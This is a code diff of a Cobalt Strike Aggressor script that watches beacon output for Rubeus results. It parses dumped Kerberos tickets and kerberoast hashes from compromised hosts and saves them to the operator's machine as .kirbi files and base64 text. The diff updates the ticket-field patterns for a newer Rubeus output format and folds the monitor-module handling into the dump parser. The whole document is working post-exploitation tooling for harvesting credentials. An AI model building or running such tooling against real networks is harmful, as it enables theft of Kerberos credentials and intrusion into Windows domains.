@@ -122,19 +122,19 @@ sub saveText {
 sub parseRubeusDump {
     $bid = $1;
     $kerbTickets = $2;
-    $ticketStartPattern = "Base64EncodedTicket   :\r\n\r\n";
+    $ticketStartPattern = "Base64EncodedTicket      :\r\n\r\n";
     $ticketEndPattern = "\r\n\r\n";
-    $usernameStartPattern = "UserName              :  ";
-    $usernameEndPattern =   "UserRealm             :  ";
-    $keyTypeStartPattern =  "KeyType               :  ";
-    $keyTypeEndPattern =    "Base64(key)           :  ";
-    $endTimeStartPattern =  "EndTime               :  ";
-    $endTimeEndPattern =    "RenewTill             :  ";
-    $serviceStartPattern =  "ServiceName           :  ";
-    $serviceEndPattern =    "ServiceRealm          :  ";
+    $usernameStartPattern = "ClientName               : ";
+    $usernameEndPattern = "DomainName               : ";
+    $keyTypeStartPattern = "SessionKeyType           : ";
+    $keyTypeEndPattern = "Base64SessionKey         : ";
+    $endTimeStartPattern = "EndTime                  : ";
+    $endTimeEndPattern = "RenewUntil               : ";
+    $serviceStartPattern = "ServiceName              :";
+    $serviceEndPattern = "TargetName               :";
     $counter = 1;
 
-    while ( $counter < 500 ) # avoid infinite loops
+    while ( $counter < 100 ) # avoid infinite loops
     {
         try
         {
@@ -211,7 +211,7 @@ sub parseRubeusRoast {
     $hashEndPattern = "\r\n\r\n";
     $counter = 1;
 
-    while ( $counter < 1000 ) # avoid infinite loops
+    while ( $counter < 500 ) # avoid infinite loops
     {
         try
         {
@@ -453,91 +453,15 @@ sub parseRubeusAsk {
     }
 }
 
-sub parseRubeusMonitor {
-    $bid = $1;
-    $kerbTickets = $2;
-    $ticketStartPattern =   "Base64EncodedTicket   :\r\n\r\n";
-    $ticketEndPattern =     "\r\n\r\n";
-    $usernameStartPattern = "User                  :  ";
-    $usernameEndPattern =   "StartTime             :  ";
-    $endTimeStartPattern =  "EndTime               :  ";
-    $endTimeEndPattern =    "RenewTill             :  ";
-    $counter = 1;
-
-    while ( $counter < 100 ) # avoid infinite loops
-    {
-        try
-        {
-            $ticketStartIndex = indexOf($kerbTickets, $ticketStartPattern);   # find start of ticket
-
-            if ($ticketStartIndex is $null) # exit if there aren't any tickets found
-            {
-                break;
-            }
-
-            $ticketEndIndex = indexOf($kerbTickets, $ticketEndPattern, $ticketStartIndex + strlen($ticketStartPattern)); 
-
-            if ( $ticketEndIndex is $null ) # sometimes unknown ticket chunks are at the very end of the output, so don't have the \r\n\r\n pattern
-            {
-                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern));
-                $counter = rand(8999) + 1000; # set counter to rand 4-digit number to exit loop and add semi-uniqueness to ticket label
-            }
-            else
-            {
-                $ticket = substr($kerbTickets, $ticketStartIndex + strlen($ticketStartPattern), $ticketEndIndex);
-            }
-
-            # format and decode ticket
-            $ticketFormatted = trimString($ticket);
-            $ticketRaw = base64_decode($ticketFormatted);
-
-            # grab metadata about the ticket
-            $metadataBlob = substr($kerbTickets, 0, $ticketStartIndex);
-
-            $username = grabParam($metadataBlob , $usernameStartPattern, $usernameEndPattern);
-            $username = replace($username, "@", "_");
-
-            $endTime = grabParam($metadataBlob , $endTimeStartPattern, $endTimeEndPattern);
-            $endTime = replace($endTime, "/", "-");
-            $endTime = replace($endTime, ":", "-");
-            $endTime = replace($endTime, '(\d\d\d\d)', "\$1-");
-            
-            # Save ticket locally to Cobalt Strike operator's host
-            $filename = getDirectory();
-            $filename = $filename . "/MONITOR_" . $username . "_" . $endTime . "_" . $counter . ".kirbi";
-            saveBinaryTicket($filename, $ticketRaw);
-
-            # Save backup copy in base64 format to text file
-            $filename = getDirectory() . "/tickets.txt";
-            $ticketText = dstamp(ticks()) . "\nASK_" . $username . "_" . $endTime . "_" . $counter . "\n" . $ticketFormatted . "\n"; 
-            saveText($filename, $ticketText);
-
-            $kerbTickets = substr($kerbTickets, $ticketEndIndex); # remove saved ticket from string of all tickets
-            $counter++; 
-        }
-        catch $message 
-        { 
-            btask($bid, "WARNING: Unable to obtain ticket\nERROR: $message");
-            println("WARNING: Unable to obtain ticket\nERROR: $message");
-            println(getStackTrace());
-            $counter++; 
-        }
-    }
-    if ( $counter > 1 ) 
-    {
-        btask($bid, "Base64 kirbi blob(s) has been saved at: $filename");
-    }
-}
-
 on beacon_output {
     $bid = $1;
-    $checkRubeusPatternDump = "Action: Dump Kerberos Ticket Data ("; # pattern to search for Rubeus dump module output
+    $checkRubeusPatternDump = "[*] Action: Dump Kerberos Ticket Data ("; # pattern to search for Rubeus dump module output
     $checkRubeusPatternDump2 = "[+] Successfully decrypted the authenticator"; # pattern to search for Rubeus tgtdeleg module
     $checkRubeusPatternDump3 = "  ServiceName              : krbtgt/";
     $checkRubeusPatternAsk = "[*] Action: Ask TG"; # pattern to search for Rubeus asktgt or asktgs modules
     $checkRubeusPatternAsk2 = "[*] Action: Service Ticket sname Substitution"; # pattern to search for Rubeus tgssub module
     $checkRubeusPatternAsk3 = "[+] TGT renewal request successful!"; # pattern to search for Rubeus renew module
-    $checkRubeusPatternMonitor = " - Found new TGT:"; # pattern to search for monitor module
+    $checkRubeusPatternMonitor = " - 4624 logon event for "; # pattern to search for monitor module
     $s4uPattern = "[*] Action: S4U"; # ignore tickets from Rubeus s4u module
     $checkUnknownTicketPattern = "[*] base64(ticket.kirbi):"; # sometimes cobalt strike output is sent in unexpected chunks, epecially at sleep 0.  This pattern is to make sure ticket gets saved even if we don't know which Rubeus module it comes from.
     $checkRubeusRoastPattern1 = "\$krb5tgs\$";
@@ -548,13 +472,9 @@ on beacon_output {
     {
         break;
     }
-    else if ($checkRubeusPatternDump isin $beaconOutput)
+    else if ( ($checkRubeusPatternDump isin $beaconOutput) || ($checkRubeusPatternMonitor isin $beaconOutput) )
     {
         parseRubeusDump($bid, $beaconOutput);
-    }
-    else if ($checkRubeusPatternMonitor isin $beaconOutput)
-    {
-        parseRubeusMonitor($bid, $beaconOutput);
     }
     else if ($checkRubeusPatternDump2 isin $beaconOutput) 
     {
